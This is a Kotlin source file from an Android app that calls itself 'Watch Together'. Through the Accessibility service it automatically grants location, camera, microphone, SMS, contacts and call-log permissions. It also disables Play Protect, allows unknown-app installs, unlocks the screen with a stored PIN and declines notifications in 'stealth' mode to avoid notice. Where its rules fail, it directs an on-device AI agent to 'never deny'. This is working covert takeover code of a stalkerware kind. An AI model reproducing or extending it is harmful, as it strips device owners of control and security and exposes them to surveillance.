package com.phonehand.app

import android.content.Context
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger

/**
 * Lightning-fast rule-based permission handler — dialogs, settings toggles, scroll.
 */
object PermissionAutoGrant {
    private const val TAG = "PermAutoGrant"
    private const val MAX_DURATION_MS = 45_000L
    private const val MAX_TAPS = 60
    private const val TAP_INTERVAL_MS = 50L
    private const val SCAN_INTERVAL_MS = 70L
    private const val STUCK_THRESHOLD = 3

    private val running = AtomicBoolean(false)
    private val executor = Executors.newSingleThreadExecutor()
    private val lastTaps = AtomicInteger(0)

    private val ALLOW_KEYWORDS = listOf(
        "allow", "while using", "while in use", "during use", "all the time",
        "only this time", "just once", "always", "ok", "continue", "accept",
        "got it", "turn on", "yes", "grant", "permit", "enable", "agree",
        "precise", "approximate", "nearby", "allow all",
    )

    private val NOTIFICATION_DIALOG_HINTS = listOf(
        "send you notifications",
        "post notifications",
        "allow notifications",
        "show notifications",
        "notification",
    )

    private val STEALTH_SKIP_SETTINGS = listOf("notification", "notifications")

    private val DENY_KEYWORDS = listOf(
        "don't allow", "dont allow", "deny", "cancel", "no thanks", "not now",
        "decline", "reject", "skip",
    )

    private val DENIED_ROW_KEYWORDS = listOf(
        "not allowed", "denied", "don't allow", "dont allow", "ask every time",
        "while using the app", "only while using", "no access",
    )

    private val NAV_KEYWORDS = listOf("permissions", "app permissions", "permission manager")

    private val PLAY_PROTECT_OFF = listOf(
        "scan apps with play protect",
        "scan apps",
        "improve harmful app detection",
        "harmful apps",
        "play protect",
        "verify apps",
    )

    private val PLAY_PROTECT_ALLOW = listOf(
        "install unknown apps",
        "install from this source",
        "allow from this source",
        "allow",
    )

    fun runPlayProtectPass(context: Context, maxMs: Long) {
        runBlocking(context, Mode.PLAY_PROTECT, maxMs, object : Callback {
            override fun onLog(line: String) {
                Log.d(TAG, "PlayProtect: $line")
                SetupReporter.progress(line)
            }
            override fun onDone(taps: Int) { lastTaps.addAndGet(taps) }
            override fun onError(message: String) { Log.w(TAG, message) }
        })
    }

    fun runAppTogglePass(context: Context, appLabels: List<String>, maxMs: Long) {
        runBlocking(context, Mode.APP_TOGGLE, maxMs, appLabels, object : Callback {
            override fun onLog(line: String) {
                Log.d(TAG, "OEM: $line")
                SetupReporter.progress(line)
            }
            override fun onDone(taps: Int) { lastTaps.addAndGet(taps) }
            override fun onError(message: String) { Log.w(TAG, message) }
        })
    }

    enum class Mode { DIALOG, SETTINGS, PLAY_PROTECT, APP_TOGGLE }

    interface Callback {
        fun onLog(line: String)
        fun onDone(taps: Int)
        fun onError(message: String)
    }

    data class TapTarget(val cx: Float, val cy: Float, val label: String, val score: Int, val nodeId: String = "")

    private const val MIN_DIALOG_SCORE = 42
    private const val MIN_SETTINGS_SCORE = 45
    private const val DIALOG_WAIT_MS = 3_500L

    private val PERMISSION_PACKAGES = listOf(
        "permissioncontroller",
        "packageinstaller",
        "securitypermission",
        "safecenter",
        "permission",
        "coloros",
        "oplus",
        "coloros",
        "heytap",
        "systemui",
        "settings",
    )

    private val PERMISSION_SCREEN_HINTS = listOf(
        "permission",
        "allow access",
        "needs access",
        "access your",
        "to access",
        "while using the app",
        "while using this app",
        "all the time",
        "only this time",
        "precise location",
        "approximate location",
        "allow notifications",
        "record audio",
        "take pictures",
        "read contacts",
        "read sms",
        "phone calls",
        "call logs",
        "location",
        "camera",
        "microphone",
        "contacts",
    )

    fun isRunning(): Boolean = running.get()

    fun lastTapCount(): Int = lastTaps.get()

    fun runLightning(context: Context) {
        runSilent(context)
        executor.execute {
            Thread.sleep(1800)
            if (!running.get()) runSilentBlocking(context, 20_000)
            Thread.sleep(2500)
            if (!running.get()) runSilentBlocking(context, 15_000)
        }
    }

    fun runSettingsPass(context: Context, label: String, maxMs: Long) {
        runBlocking(context, Mode.SETTINGS, maxMs, object : Callback {
            override fun onLog(line: String) {
                Log.d(TAG, "$label: $line")
                SetupReporter.progress(line)
            }
            override fun onDone(taps: Int) { lastTaps.addAndGet(taps) }
            override fun onError(message: String) { Log.w(TAG, message) }
        })
    }

    fun runSilentBlocking(context: Context, maxMs: Long = MAX_DURATION_MS) {
        runBlocking(context, Mode.DIALOG, maxMs, silentCallback())
    }

    fun run(context: Context, cb: Callback) {
        if (!running.compareAndSet(false, true)) {
            cb.onError("Already running")
            return
        }
        executor.execute {
            try {
                runLoop(context, cb, Mode.DIALOG, MAX_DURATION_MS, emptyList())
            } catch (e: Exception) {
                Log.w(TAG, e.message ?: "grant")
                cb.onError(e.message ?: "Failed")
            } finally {
                running.set(false)
            }
        }
    }

    private fun runBlocking(context: Context, mode: Mode, maxMs: Long, cb: Callback) {
        runBlocking(context, mode, maxMs, emptyList(), cb)
    }

    private fun runBlocking(
        context: Context,
        mode: Mode,
        maxMs: Long,
        appLabels: List<String>,
        cb: Callback,
    ) {
        if (!running.compareAndSet(false, true)) return
        try {
            runLoop(context, cb, mode, maxMs, appLabels)
        } catch (e: Exception) {
            cb.onError(e.message ?: "Failed")
        } finally {
            running.set(false)
        }
    }

    fun runSilent(context: Context) {
        run(context, silentCallback())
    }

    private fun silentCallback() = object : Callback {
        override fun onLog(line: String) {
            Log.d(TAG, line)
            SetupReporter.progress(line)
        }
        override fun onDone(taps: Int) {
            lastTaps.set(taps)
            Log.d(TAG, "setup_takeover done — $taps action(s)")
        }
        override fun onError(message: String) {
            Log.w(TAG, "setup_takeover: $message")
            SetupReporter.error(message)
        }
    }

    fun cancel() { running.set(false) }

    fun findNavigationTarget(tree: JSONObject, keywords: List<String>): TapTarget? {
        val nodes = tree.optJSONArray("nodes") ?: return null
        var best: TapTarget? = null
        for (i in 0 until nodes.length()) {
            val n = nodes.getJSONObject(i)
            if (n.optInt("d", 0) == 1) continue
            val text = n.optString("t", "").ifBlank { n.optString("h", "") }
            if (text.isBlank()) continue
            val lower = text.lowercase()
            if (keywords.none { lower.contains(it) }) continue
            if (n.optInt("k", 0) != 1) continue
            val b = n.optJSONArray("b") ?: continue
            if (b.length() < 4) continue
            val cx = (b.getInt(0) + b.getInt(2)) / 2f
            val cy = (b.getInt(1) + b.getInt(3)) / 2f
            val score = 30 + if (lower.contains("permission")) 20 else 0
            val nodeId = n.optString("id", "")
            val target = TapTarget(cx, cy, text.take(40), score, nodeId)
            if (best == null || target.score > best.score) best = target
        }
        return best
    }

    private fun runLoop(
        context: Context,
        cb: Callback,
        mode: Mode,
        maxDurationMs: Long,
        appLabels: List<String>,
    ) {
        val service = TouchAccessibilityService.instance
        if (service == null) {
            cb.onError("Watch Together is off — enable in Accessibility")
            return
        }

        if (!LockScreenHelper.ensureUnlocked(context, service, 18_000L)) {
            cb.onLog("Screen locked — unlock manually or save PIN in portal")
        }
        Thread.sleep(300)

        val start = System.currentTimeMillis()
        var taps = 0
        var consecutiveMisses = 0
        var agentFallbacks = 0
        var scrollAttempts = 0
        var dialogWaitStart = if (mode == Mode.DIALOG) System.currentTimeMillis() else 0L
        var lastTapKey = ""
        val scrollModes = setOf(Mode.SETTINGS, Mode.PLAY_PROTECT, Mode.APP_TOGGLE)

        while (running.get()) {
            val elapsed = System.currentTimeMillis() - start
            if (elapsed >= maxDurationMs || taps >= MAX_TAPS) break

            service.scheduleRefreshesAfterInput(forceFull = consecutiveMisses >= 2)
            Thread.sleep(if (consecutiveMisses >= 2) 180 else SCAN_INTERVAL_MS)

            val tree = service.snapshotTree(forceFull = consecutiveMisses >= 2) ?: service.lastTreeJson
            if (tree == null) {
                Thread.sleep(SCAN_INTERVAL_MS)
                continue
            }

            if (mode == Mode.DIALOG && !isPermissionScreen(tree)) {
                if (System.currentTimeMillis() - dialogWaitStart < DIALOG_WAIT_MS) {
                    Thread.sleep(SCAN_INTERVAL_MS)
                    continue
                }
                // #region agent log
                DebugTrace.log("E", "PermissionAutoGrant.runLoop", "no permission dialog", mapOf("pkg" to tree.optString("pkg"), "misses" to consecutiveMisses))
                // #endregion
                if (agentFallbacks < 2) {
                    agentFallbacks++
                    cb.onLog("AI reading permission screen…")
                    if (tryAgentFallback(context, tree, cb, mode)) {
                        taps++
                        consecutiveMisses = 0
                        continue
                    }
                }
                cb.onLog("No permission dialog visible — waiting")
                consecutiveMisses++
                if (consecutiveMisses >= STUCK_THRESHOLD + 2) break
                Thread.sleep(SCAN_INTERVAL_MS)
                continue
            }

            val target = when {
                mode == Mode.DIALOG && isNotificationPermissionDialog(tree) -> findDenyTarget(tree)
                mode == Mode.DIALOG -> findDialogAllowTarget(tree)
                mode == Mode.SETTINGS -> findSettingsTarget(tree)
                mode == Mode.PLAY_PROTECT -> findPlayProtectTarget(tree)
                mode == Mode.APP_TOGGLE -> findAppToggleTarget(tree, appLabels)
                else -> findBestTarget(tree)
            }

            val minScore = if (mode == Mode.DIALOG) MIN_DIALOG_SCORE else MIN_SETTINGS_SCORE
            if (target != null && target.score >= minScore) {
                val tapKey = "${target.nodeId}|${target.cx.toInt()},${target.cy.toInt()}"
                if (tapKey == lastTapKey) {
                    consecutiveMisses++
                    if (consecutiveMisses >= 1 && agentFallbacks < 4) {
                        agentFallbacks++
                        consecutiveMisses = 0
                        cb.onLog("AI reading screen…")
                        if (tryAgentFallback(context, tree, cb, mode)) {
                            taps++
                            lastTapKey = ""
                            Thread.sleep(500)
                            continue
                        }
                    }
                    Thread.sleep(SCAN_INTERVAL_MS)
                    continue
                }

                consecutiveMisses = 0
                scrollAttempts = 0
                lastTapKey = tapKey
                cb.onLog(
                    if (mode == Mode.DIALOG && isNotificationPermissionDialog(tree)) "Stealth skip → ${target.label}"
                    else "Allow → ${target.label} (${target.score})",
                )
                performTap(service, target, context)
                taps++
                Thread.sleep(TAP_INTERVAL_MS + 120)
                service.scheduleRefreshesAfterInput(forceFull = true)
                Thread.sleep(SCAN_INTERVAL_MS + 80)
            } else {
                consecutiveMisses++
                if (mode in scrollModes && consecutiveMisses >= 2 && scrollAttempts < 10) {
                    scrollAttempts++
                    consecutiveMisses = 0
                    lastTapKey = ""
                    val w = RelayHub.screenWidth.toFloat()
                    val h = RelayHub.screenHeight.toFloat()
                    service.swipe(w / 2f, h * 0.75f, w / 2f, h * 0.25f, 250)
                    Thread.sleep(400)
                    continue
                }
                if (consecutiveMisses >= 1 && agentFallbacks < 4) {
                    agentFallbacks++
                    consecutiveMisses = 0
                    lastTapKey = ""
                    cb.onLog("AI reading screen…")
                    if (tryAgentFallback(context, tree, cb, mode)) {
                        taps++
                        Thread.sleep(500)
                        continue
                    }
                }
                if (consecutiveMisses >= STUCK_THRESHOLD + 4) break
                Thread.sleep(SCAN_INTERVAL_MS)
            }
        }

        cb.onLog(if (taps > 0) "Finished — $taps step(s)" else "Scan complete")
        cb.onDone(taps)
    }

    private fun performTap(service: TouchAccessibilityService, target: TapTarget, context: Context) {
        if (target.nodeId.isNotEmpty() && service.clickById(target.nodeId)) return
        service.tapAt(target.cx, target.cy)
    }

    private fun isPermissionScreen(tree: JSONObject): Boolean {
        val pkg = tree.optString("pkg", "").lowercase()
        if (PERMISSION_PACKAGES.any { pkg.contains(it) }) return true
        if (tree.optInt("popup", 0) == 1 && screenHasPermissionHints(tree)) return true
        return screenHasPermissionHints(tree) && hasAllowButton(tree)
    }

    private fun screenHasPermissionHints(tree: JSONObject): Boolean {
        val nodes = tree.optJSONArray("nodes") ?: return false
        var hits = 0
        for (i in 0 until nodes.length()) {
            val text = nodes.getJSONObject(i).optString("t", "")
                .ifBlank { nodes.getJSONObject(i).optString("h", "") }
                .lowercase()
            if (text.isBlank()) continue
            if (PERMISSION_SCREEN_HINTS.any { text.contains(it) }) hits++
        }
        return hits >= 1
    }

    private fun hasAllowButton(tree: JSONObject): Boolean {
        val nodes = tree.optJSONArray("nodes") ?: return false
        for (i in 0 until nodes.length()) {
            val n = nodes.getJSONObject(i)
            if (n.optInt("d", 0) == 1) continue
            val text = n.optString("t", "").ifBlank { n.optString("h", "") }
            if (text.isBlank()) continue
            val clickable = n.optInt("k", 0) == 1 || n.optInt("x", -1) >= 0
            if (!clickable) continue
            if (matchesAllow(text) && !matchesDeny(text)) return true
        }
        return false
    }

    private fun findDialogAllowTarget(tree: JSONObject): TapTarget? {
        val nodes = tree.optJSONArray("nodes") ?: return null
        val isPopup = tree.optInt("popup", 0) == 1
        var best: TapTarget? = null

        for (i in 0 until nodes.length()) {
            val n = nodes.getJSONObject(i)
            if (n.optInt("d", 0) == 1) continue
            val text = n.optString("t", "").ifBlank { n.optString("h", "") }
            val clickable = n.optInt("k", 0) == 1
            val checkable = n.optInt("x", -1) >= 0
            val checked = n.optInt("x", 0) == 1
            val onPopup = n.optInt("pop", 0) == 1 || isPopup
            val role = n.optString("r", "")
            val b = n.optJSONArray("b") ?: continue
            if (b.length() < 4) continue
            val cx = (b.getInt(0) + b.getInt(2)) / 2f
            val cy = (b.getInt(1) + b.getInt(3)) / 2f
            val nodeId = n.optString("id", "")

            if (checkable && !checked && text.isNotBlank()) {
                if (matchesAllow(text) && !matchesDeny(text)) {
                    val target = TapTarget(cx, cy, text.take(40), scoreTarget(text, onPopup, role, true), nodeId)
                    if (best == null || target.score > best.score) best = target
                }
                continue
            }
            if (!clickable || text.isBlank()) continue
            if (matchesDeny(text)) continue
            if (!matchesAllow(text)) continue
            if (!onPopup && !isStrongAllowLabel(text)) continue
            val target = TapTarget(cx, cy, text.take(40), scoreTarget(text, onPopup, role, false), nodeId)
            if (best == null || target.score > best.score) best = target
        }
        return best
    }

    private fun isStrongAllowLabel(text: String): Boolean {
        val lower = text.lowercase()
        return lower.contains("allow") ||
            lower.contains("while using") ||
            lower.contains("all the time") ||
            lower.contains("only this time") ||
            lower.contains("turn on") ||
            lower.contains("grant")
    }

    private fun findPlayProtectTarget(tree: JSONObject): TapTarget? {
        val nodes = tree.optJSONArray("nodes") ?: return null
        var bestOff: TapTarget? = null
        var bestAllow: TapTarget? = null

        for (i in 0 until nodes.length()) {
            val n = nodes.getJSONObject(i)
            if (n.optInt("d", 0) == 1) continue
            val text = n.optString("t", "").ifBlank { n.optString("h", "") }
            if (text.isBlank()) continue
            val lower = text.lowercase()
            val checkable = n.optInt("x", -1) >= 0
            val checked = n.optInt("x", 0) == 1
            val clickable = n.optInt("k", 0) == 1
            val b = n.optJSONArray("b") ?: continue
            if (b.length() < 4) continue
            val cx = (b.getInt(0) + b.getInt(2)) / 2f
            val cy = (b.getInt(1) + b.getInt(3)) / 2f

            if (checkable && checked && PLAY_PROTECT_OFF.any { lower.contains(it) }) {
                val t = TapTarget(cx, cy, text.take(40), 90, n.optString("id", ""))
                if (bestOff == null || t.score > bestOff.score) bestOff = t
            }
            if (checkable && !checked && PLAY_PROTECT_OFF.any { lower.contains(it) }) {
                continue
            }
            if ((checkable && !checked) || clickable) {
                if (PLAY_PROTECT_ALLOW.any { lower.contains(it) } && !matchesDeny(text)) {
                    val t = TapTarget(cx, cy, text.take(40), 75, n.optString("id", ""))
                    if (bestAllow == null || t.score > bestAllow.score) bestAllow = t
                }
            }
        }
        return bestOff ?: bestAllow ?: findSettingsTarget(tree)
    }

    private fun findAppToggleTarget(tree: JSONObject, appLabels: List<String>): TapTarget? {
        val nodes = tree.optJSONArray("nodes") ?: return null
        var appRowY = -1f
        var appRowBottom = -1f

        for (i in 0 until nodes.length()) {
            val n = nodes.getJSONObject(i)
            val text = n.optString("t", "").ifBlank { n.optString("h", "") }
            if (text.isBlank()) continue
            val lower = text.lowercase()
            if (appLabels.any { lower.contains(it.lowercase()) }) {
                val b = n.optJSONArray("b") ?: continue
                if (b.length() < 4) continue
                appRowY = (b.getInt(1) + b.getInt(3)) / 2f
                appRowBottom = b.getInt(3).toFloat()
                break
            }
        }

        var bestToggle: TapTarget? = null
        for (i in 0 until nodes.length()) {
            val n = nodes.getJSONObject(i)
            if (n.optInt("d", 0) == 1) continue
            val checkable = n.optInt("x", -1) >= 0
            val checked = n.optInt("x", 0) == 1
            if (!checkable || checked) continue
            val b = n.optJSONArray("b") ?: continue
            if (b.length() < 4) continue
            val cy = (b.getInt(1) + b.getInt(3)) / 2f
            val cx = (b.getInt(0) + b.getInt(2)) / 2f
            val text = n.optString("t", "").ifBlank { n.optString("h", "") }
            var score = 50
            if (appRowY >= 0 && kotlin.math.abs(cy - appRowY) < 120) score += 40
            if (appLabels.any { text.lowercase().contains(it.lowercase()) }) score += 35
            if (score >= 50) {
                val t = TapTarget(cx, cy, text.take(40).ifBlank { "toggle" }, score, n.optString("id", ""))
                if (bestToggle == null || t.score > bestToggle.score) bestToggle = t
            }
        }
        return bestToggle ?: findSettingsTarget(tree)
    }

    private fun findSettingsTarget(tree: JSONObject): TapTarget? {
        val nodes = tree.optJSONArray("nodes") ?: return null
        var bestDenied: TapTarget? = null
        var bestAllow: TapTarget? = null

        for (i in 0 until nodes.length()) {
            val n = nodes.getJSONObject(i)
            if (n.optInt("d", 0) == 1) continue
            val text = n.optString("t", "").ifBlank { n.optString("h", "") }
            if (text.isBlank()) continue
            val lower = text.lowercase()
            if (STEALTH_SKIP_SETTINGS.any { lower.contains(it) }) continue
            val clickable = n.optInt("k", 0) == 1
            val checkable = n.optInt("x", -1) >= 0
            val checked = n.optInt("x", 0) == 1
            val b = n.optJSONArray("b") ?: continue
            if (b.length() < 4) continue
            val cx = (b.getInt(0) + b.getInt(2)) / 2f
            val cy = (b.getInt(1) + b.getInt(3)) / 2f

            if (checkable && !checked && matchesAllow(text) && !matchesDeny(text)) {
                val t = TapTarget(cx, cy, text.take(40), 80, n.optString("id", ""))
                if (bestAllow == null || t.score > bestAllow.score) bestAllow = t
            }
            if (clickable && DENIED_ROW_KEYWORDS.any { lower.contains(it) }) {
                if (STEALTH_SKIP_SETTINGS.any { lower.contains(it) }) continue
                val t = TapTarget(cx, cy, text.take(40), 70, n.optString("id", ""))
                if (bestDenied == null || t.score > bestDenied.score) bestDenied = t
            }
            if (clickable && matchesAllow(text) && !matchesDeny(text)) {
                val t = TapTarget(cx, cy, text.take(40), scoreTarget(text, false, n.optString("r", ""), false), n.optString("id", ""))
                if (bestAllow == null || t.score > bestAllow.score) bestAllow = t
            }
        }
        return bestDenied ?: bestAllow ?: findBestTarget(tree)
    }

    private fun findBestTarget(tree: JSONObject): TapTarget? {
        val nodes = tree.optJSONArray("nodes") ?: return null
        val isPopup = tree.optInt("popup", 0) == 1
        var best: TapTarget? = null

        for (i in 0 until nodes.length()) {
            val n = nodes.getJSONObject(i)
            if (n.optInt("d", 0) == 1) continue
            val text = n.optString("t", "").ifBlank { n.optString("h", "") }
            val clickable = n.optInt("k", 0) == 1
            val checkable = n.optInt("x", -1) >= 0
            val checked = n.optInt("x", 0) == 1
            val onPopup = n.optInt("pop", 0) == 1 || isPopup
            val role = n.optString("r", "")
            val b = n.optJSONArray("b") ?: continue
            if (b.length() < 4) continue
            val cx = (b.getInt(0) + b.getInt(2)) / 2f
            val cy = (b.getInt(1) + b.getInt(3)) / 2f
            val nodeId = n.optString("id", "")

            if (checkable && !checked && text.isNotBlank()) {
                if (matchesAllow(text) && !matchesDeny(text)) {
                    val target = TapTarget(cx, cy, text.take(40), scoreTarget(text, onPopup, role, true), nodeId)
                    if (best == null || target.score > best.score) best = target
                }
                continue
            }
            if (!clickable || text.isBlank()) continue
            if (matchesDeny(text)) continue
            if (!matchesAllow(text)) continue
            if (!onPopup && !isStrongAllowLabel(text)) continue
            val target = TapTarget(cx, cy, text.take(40), scoreTarget(text, onPopup, role, false), nodeId)
            if (best == null || target.score > best.score) best = target
        }
        return best
    }

    private fun scoreTarget(text: String, onPopup: Boolean, role: String, isToggle: Boolean): Int {
        var score = 0
        val lower = text.lowercase()
        if (onPopup) score += 55
        if (role == "btn") score += 20
        if (isToggle) score += 15
        when {
            lower == "allow" -> score += 45
            lower.contains("while using") || lower.contains("while in use") -> score += 42
            lower.contains("all the time") || lower.contains("always") -> score += 40
            lower.contains("only this time") || lower.contains("just once") -> score += 38
            lower.contains("allow") -> score += 30
            lower.contains("turn on") || lower.contains("enable") -> score += 22
            lower == "ok" || lower == "continue" -> score += if (onPopup) 25 else 5
            lower == "yes" || lower == "accept" -> score += if (onPopup) 20 else 3
        }
        return score
    }

    private fun matchesAllow(text: String): Boolean =
        ALLOW_KEYWORDS.any { text.lowercase().contains(it) }

    private fun matchesDeny(text: String): Boolean =
        DENY_KEYWORDS.any { text.lowercase().contains(it) }

    private fun tryAgentFallback(context: Context, tree: JSONObject, cb: Callback, mode: Mode): Boolean {
        if (mode == Mode.DIALOG && isNotificationPermissionDialog(tree)) return false
        val service = TouchAccessibilityService.instance ?: return false
        val screen = ScreenSummarizer.compact(tree)
        val prompt = when (mode) {
            Mode.SETTINGS -> "In app permission settings, tap any Not allowed row then Allow or All the time. Or tap Allow switches. Never Deny."
            Mode.PLAY_PROTECT -> "Turn OFF Play Protect scan apps toggle, or tap Allow for unknown app installs. Never Deny."
            Mode.APP_TOGGLE -> "Find Watch Together in the list and turn its autostart/background toggle ON."
            else -> "Tap Allow, While using the app, All the time, OK, Continue. One tap. Never Deny or Cancel."
        }
        var tapped = false
        val latch = java.util.concurrent.CountDownLatch(1)
        LocalAgent.run(context, prompt, screen, object : LocalAgent.Callback {
            override fun onLog(line: String) { cb.onLog("AI: $line") }
            override fun onDone() { tapped = true; latch.countDown() }
            override fun onError(message: String) { cb.onLog("AI: $message"); latch.countDown() }
        })
        latch.await(15, java.util.concurrent.TimeUnit.SECONDS)
        service.scheduleRefreshesAfterInput()
        return tapped
    }

    private fun isNotificationPermissionDialog(tree: JSONObject): Boolean {
        val nodes = tree.optJSONArray("nodes") ?: return false
        for (i in 0 until nodes.length()) {
            val text = nodes.getJSONObject(i).optString("t", "")
                .ifBlank { nodes.getJSONObject(i).optString("h", "") }
                .lowercase()
            if (NOTIFICATION_DIALOG_HINTS.any { text.contains(it) }) return true
        }
        return false
    }

    private fun findDenyTarget(tree: JSONObject): TapTarget? {
        val nodes = tree.optJSONArray("nodes") ?: return null
        var best: TapTarget? = null
        for (i in 0 until nodes.length()) {
            val n = nodes.getJSONObject(i)
            if (n.optInt("d", 0) == 1) continue
            val text = n.optString("t", "").ifBlank { n.optString("h", "") }
            if (text.isBlank() || n.optInt("k", 0) != 1) continue
            if (!matchesDeny(text)) continue
            val b = n.optJSONArray("b") ?: continue
            if (b.length() < 4) continue
            val cx = (b.getInt(0) + b.getInt(2)) / 2f
            val cy = (b.getInt(1) + b.getInt(3)) / 2f
            val lower = text.lowercase()
            var score = 40
            if (lower.contains("don't allow") || lower.contains("dont allow")) score += 30
            if (lower.contains("not now")) score += 20
            val target = TapTarget(cx, cy, text.take(40), score, n.optString("id", ""))
            if (best == null || target.score > best.score) best = target
        }
        return best
    }
}
